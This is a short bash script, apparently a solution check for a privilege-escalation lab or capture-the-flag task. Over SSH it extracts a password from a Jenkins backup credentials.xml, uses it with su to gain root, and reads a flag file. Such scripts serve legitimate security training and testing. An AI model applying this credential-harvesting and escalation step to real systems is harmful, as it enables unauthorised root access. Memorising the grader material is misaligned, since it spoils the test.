#!/usr/bin/env bash
set -euo pipefail
source "$(cd "$(dirname "$0")" && pwd)/_common.sh"
out="$(ssh_run '
PASS=$(sed -n "s:.*<password>\(.*\)</password>.*:\1:p" /home/lowpriv/jenkins_backup/credentials.xml | head -1)
printf "%s\n" "$PASS" | su - root -c "cat /root/flag.txt"
')"
assert_root_output "${out}" 
